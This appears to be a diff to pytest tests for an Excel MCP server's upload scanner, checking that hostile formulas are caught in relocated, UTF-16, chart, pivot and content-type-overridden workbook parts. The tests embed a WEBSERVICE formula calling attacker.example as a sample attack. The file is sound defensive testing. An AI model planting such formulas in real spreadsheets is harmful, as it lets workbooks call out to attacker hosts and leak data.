@@ -15,6 +15,7 @@ from excel_mcp.operations.files import decode_workbook
 from excel_mcp.upload_scan import scan_package
 from tests.conftest import ToolCall
 
+MAIN = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
 ATTACK = 'WEBSERVICE("https://attacker.example")'
 pytestmark = pytest.mark.anyio
 LIMITS = Limits()
@@ -61,12 +62,14 @@ def test_a_plain_workbook_is_accepted() -> None:
     ["customXml/item1.dat", "docProps/notes.TXT", "xl/media/pic.png", "other.xmL", "Sheet"],
 )
 def test_formulas_are_found_in_xml_parts_whatever_they_are_called(name: str) -> None:
-    sheet = f"<worksheet><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
+    sheet = (
+        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
+    )
     assert "not allowed" in _rejected(_package([(name, sheet.encode())]))
 
 
 def test_formulas_are_found_in_utf16_xml_parts() -> None:
-    sheet = f"<worksheet><f>{ATTACK}</f></worksheet>".encode("utf-16")
+    sheet = f"<worksheet {MAIN}><f>{ATTACK}</f></worksheet>".encode("utf-16")
     assert "not allowed" in _rejected(_package([("misc/data.bin", sheet)]))
 
 
@@ -184,7 +187,11 @@ PRESERVED_PARTS = [
 ]
 
 
-_NAMESPACES = 'xmlns:cx="urn:chartex" xmlns:x14="urn:x14" xmlns:xm="urn:xm"'
+_NAMESPACES = (
+    'xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" '
+    'xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" '
+    'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"'
+)
 _QUOTED = ATTACK.replace('"', "&quot;")
 
 
@@ -194,9 +201,9 @@ _QUOTED = ATTACK.replace('"', "&quot;")
     [
         f"<cx:chartSpace {_NAMESPACES}><cx:f>{ATTACK}</cx:f></cx:chartSpace>",
         f"<root {_NAMESPACES}><x14:sparkline><xm:f>{ATTACK}</xm:f></x14:sparkline></root>",
-        f'<root><cacheField name="x" formula="{_QUOTED}"/></root>',
-        f'<root><calculatedItem formula="{_QUOTED}"/></root>',
-        f"<root><formula1>{ATTACK}</formula1></root>",
+        f'<root {MAIN}><cacheField name="x" formula="{_QUOTED}"/></root>',
+        f'<root {MAIN}><calculatedItem formula="{_QUOTED}"/></root>',
+        f"<root {MAIN}><formula1>{ATTACK}</formula1></root>",
     ],
 )
 def test_hostile_formulas_in_preserved_parts_are_found(name: str, body: str) -> None:
@@ -204,7 +211,10 @@ def test_hostile_formulas_in_preserved_parts_are_found(name: str, body: str) -> 
 
 
 def test_pivot_formulas_are_checked_for_safety_but_not_for_syntax() -> None:
-    cache = b'<root><cacheField name="x" formula="&apos;Total Sales&apos;*2+Region[North]"/></root>'
+    cache = (
+        f"<root {MAIN}>".encode()
+        + b'<cacheField name="x" formula="&apos;Total Sales&apos;*2+Region[North]"/></root>'
+    )
     _decode(_package([("xl/pivotCache/pivotCacheDefinition1.xml", cache)]))
 
 
@@ -242,3 +252,31 @@ async def test_a_workbook_with_everything_the_server_can_add_is_accepted(
     )
 
     _decode(sample.read_bytes())
+
+
+CUSTOM = (
+    b'<item xmlns="urn:company:properties"><f>some text, not a formula</f>'
+    b"<formula>1 + (</formula></item>"
+)
+
+
+def test_parts_in_other_namespaces_are_not_read_as_formulas() -> None:
+    _decode(_package([("customXml/item1.xml", CUSTOM), ("docs/anything.dat", CUSTOM)]))
+
+
+def test_a_relocated_sheet_in_the_spreadsheetml_namespace_is_still_checked() -> None:
+    sheet = (
+        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
+    )
+    assert "not allowed" in _rejected(_package([("customXml/hidden.dat", sheet.encode())]))
+
+
+def test_parts_that_claim_an_excel_content_type_are_checked_in_any_namespace() -> None:
+    types = _base()["[Content_Types].xml"].replace(
+        b"</Types>",
+        b'<Override PartName="/customXml/item1.xml" ContentType="application/vnd.openxmlformats-'
+        b'officedocument.spreadsheetml.sheet.main+xml"/></Types>',
+    )
+    body = f'<item xmlns="urn:company:properties"><f>{ATTACK}</f></item>'.encode()
+    content = _package([("customXml/item1.xml", body)], replace={"[Content_Types].xml": types})
+    assert "not allowed" in _rejected(content)
